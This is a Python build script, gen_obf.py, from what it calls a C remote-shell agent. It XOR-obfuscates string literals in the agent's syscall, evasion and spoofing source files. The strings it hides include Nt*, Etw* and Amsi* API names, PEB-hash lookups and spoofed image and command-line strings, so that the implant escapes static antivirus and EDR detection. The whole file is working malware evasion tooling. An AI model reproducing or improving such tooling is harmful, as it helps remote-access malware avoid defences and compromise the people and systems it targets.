#!/usr/bin/env python3
"""
gen_obf.py  –  Build-time XOR string obfuscation for the C remote-shell agent
==============================================================================

Run from client/evasion/:
    python3 gen_obf.py

Produces syscall_obf.c, evasion_obf.c, spoof_obf.c with all sensitive string
literals replaced by XOR-encoded byte blobs decoded at runtime via _obf_s() /
_obf_w() from obf.h.

Four bug-fixed behaviours vs v1:
  1. sc_names[] is a static initialiser — function calls are illegal there.
     The array is replaced by a sc_get_name(i) switch function.
  2. WCHAR accessor no longer calls itself recursively (s_image_get returned
     s_image_get() instead of s_image).
  3. WCHAR accessor returns WCHAR* (not const WCHAR*) so .Buffer assignment
     compiles without -Wdiscarded-qualifiers.
  4. Comment-only lines are never transformed, preventing phantom blobs from
     doc strings like "foo.dll" in block comments.
"""

import re, os, hashlib

# ── Encoding ───────────────────────────────────────────────────────────────────

def _key(s: str) -> int:
    h = int(hashlib.md5(s.encode()).hexdigest()[:4], 16)
    k = ((h * 0x6B) ^ 0xA5) & 0xFF
    return k | 0x01   # always odd, never zero

def encode_narrow(s: str):
    k = _key(s)
    raw = (s + '\x00').encode('latin-1')
    return k, [k] + [b ^ k for b in raw]

def encode_wide(s: str):
    k = _key('W:' + s)
    raw = (s + '\x00').encode('utf-16-le')
    return k, [k] + [b ^ k for b in raw]

def blob_id(s: str) -> str:
    return '_e_' + hashlib.md5(s.encode()).hexdigest()[:6]

def narrow_blob(s: str):
    """Returns (decl_line, call_expr)."""
    name = blob_id(s)
    k, blob = encode_narrow(s)
    n = len(s) + 1
    bstr = ', '.join(f'0x{b:02X}' for b in blob)
    decl = f'static const unsigned char {name}[] = {{ {bstr} }}; /* obf:{repr(s)} */\n'
    # OBF_S decodes into a stack-local buffer — no static buffer survives the call
    expr = f'OBF_S({name}, {n})'
    return decl, expr

def wide_blob(s: str):
    """Returns (decl_line, call_expr)."""
    name = blob_id('W:' + s)
    k, blob = encode_wide(s)
    n = len(s) + 1
    bstr = ', '.join(f'0x{b:02X}' for b in blob)
    decl = f'static const unsigned char {name}[] = {{ {bstr} }}; /* wobf:{repr(s)} */\n'
    # OBF_W decodes into a stack-local buffer
    expr = f'OBF_W({name}, {n})'
    return decl, expr

# ── Patterns ──────────────────────────────────────────────────────────────────

RE_HASH_STR  = re.compile(r'peb_hash_str\("([^"]+)"\)')
RE_BARE_STR  = re.compile(r'"(Nt[A-Za-z]+|Etw[A-Za-z]+|Amsi[A-Za-z]+)"')
RE_WCHAR_DCL = re.compile(r'static\s+WCHAR\s+(\w+)\[\]\s*=\s*L"([^"]+)"\s*;')
RE_SCNAMES   = re.compile(
    r'static const char \* const sc_names\[SC_COUNT\] = \{.*?\};', re.DOTALL)

def is_comment_line(line: str) -> bool:
    s = line.lstrip()
    return s.startswith('//') or s.startswith('*') or s.startswith('/*')

# ── Transform ─────────────────────────────────────────────────────────────────

def transform(src: str, wchar_vars: list = None) -> str:
    decls  = {}   # blob_id -> decl string (deduplicated)
    wchar_vars = wchar_vars or []

    # 1. peb_hash_str("x")  →  peb_hash_str(_obf_s(...))
    # Only on non-comment lines — RE_HASH_STR runs globally so we do it
    # line-by-line to skip block-comment lines like " *  peb_hash_str("foo")".
    def sub_hash(m):
        s = m.group(1)
        d, e = narrow_blob(s)
        decls[blob_id(s)] = d
        return f'peb_hash_str({e})'

    lines_h = src.splitlines(keepends=True)
    src = ''.join(
        RE_HASH_STR.sub(sub_hash, line) if not is_comment_line(line) else line
        for line in lines_h
    )

    # 2. sc_names[] static initialiser  →  sc_get_name(i) switch function
    sc_strings = []
    def sub_scnames(m):
        body = m.group(0)
        for s in re.findall(r'"([^"]+)"', body):
            d, e = narrow_blob(s)
            decls[blob_id(s)] = d
            sc_strings.append((s, e, len(s)+1))
        return '/* sc_names[] replaced by sc_get_name() */'
    src = RE_SCNAMES.sub(sub_scnames, src)
    src = re.sub(r'\bsc_names\[i\]', 'sc_get_name(i)', src)

    # 3. Bare "NtFoo"/"EtwFoo"/"AmsiFoo" on non-comment code lines
    lines = src.splitlines(keepends=True)
    out = []
    for line in lines:
        if is_comment_line(line):
            out.append(line)
            continue
        def sub_bare(m):
            s = m.group(1)
            d, e = narrow_blob(s)
            decls[blob_id(s)] = d
            return e
        out.append(RE_BARE_STR.sub(sub_bare, line))
    src = ''.join(out)

    # 4. static WCHAR var[] = L"..."  →  blob + non-recursive accessor
    def sub_wchar(m):
        varname, s = m.group(1), m.group(2)
        d, e = wide_blob(s)
        n = len(s) + 1
        # Return WCHAR* (not const) so .Buffer assignment compiles cleanly.
        # Use 's_image_buf' style inner variable to avoid self-recursion.
        code = (
            f'{d}'
            f'static WCHAR {varname}[{n+1}];\n'
            f'static WCHAR *{varname}_get(void) {{\n'
            f'    if (!{varname}[0]) {{\n'
            f'        const WCHAR *_p = {e};\n'
            f'        int _i; for (_i = 0; _i <= {len(s)}; _i++) {varname}[_i] = _p[_i];\n'
            f'    }}\n'
            f'    return {varname};\n'
            f'}}\n'
        )
        # blob is already inline — don't add to decls
        return code
    src = RE_WCHAR_DCL.sub(sub_wchar, src)

    # 5. Fix refs to WCHAR vars outside their own getter bodies.
    # Walk line by line; track brace depth, entering getter-protection when
    # the getter signature is seen.  Count braces on the signature line too.
    for v in wchar_vars:
        getter_start = f'static WCHAR *{v}_get(void)'
        lines2 = src.splitlines(keepends=True)
        result = []
        in_getter = False
        depth = 0
        for line in lines2:
            if getter_start in line:
                in_getter = True
                # Count braces ON the signature line (the { is on the same line)
                depth = line.count('{') - line.count('}')
                result.append(line)
                continue
            if in_getter:
                depth += line.count('{') - line.count('}')
                result.append(line)
                if depth <= 0:
                    in_getter = False
                continue
            # Outside getter — apply substitution
            result.append(re.sub(rf'\b{v}\b(?!_get\b|\[)', f'{v}_get()', line))
        src = ''.join(result)

    # 6. Build sc_get_name() switch
    sc_fn = ''
    if sc_strings:
        cases = ''.join(f'    case {i}: return {e};\n'
                        for i, (s, e, n) in enumerate(sc_strings))
        sc_fn = (
            f'\nstatic const char *sc_get_name(int i) {{\n'
            f'    switch (i) {{\n{cases}'
            f'    default: return "";\n'
            f'    }}\n}}\n'
        )

    # 7. Insert blob declarations + helpers after last #include
    block = '\n/* ── XOR blobs (gen_obf.py) ── */\n#include "obf.h"\n'
    block += ''.join(v for v in decls.values())
    block += sc_fn
    block += '/* ── end XOR blobs ── */\n\n'

    last = max((m.end() for m in re.finditer(r'#include\s+[<"][^>"]+[>"]', src)),
               default=0)
    src = src[:last] + '\n' + block + src[last:]
    return src

# ── Main ──────────────────────────────────────────────────────────────────────

FILES      = ['syscall.c', 'evasion.c', 'spoof.c']
WCHAR_VARS = {'spoof.c': ['s_image', 's_cmdline']}

def main():
    d = os.path.dirname(os.path.abspath(__file__))
    for fname in FILES:
        src = open(os.path.join(d, fname), encoding='utf-8').read()
        out = transform(src, WCHAR_VARS.get(fname, []))
        outname = fname.replace('.c', '_obf.c')
        with open(os.path.join(d, outname), 'w', encoding='utf-8') as f:
            f.write(f'/* AUTO-GENERATED by gen_obf.py — DO NOT EDIT. Source: {fname} */\n\n')
            f.write(out)
        print(f'OK: {fname} -> {outname}')
    print('Done.')

if __name__ == '__main__':
    main()
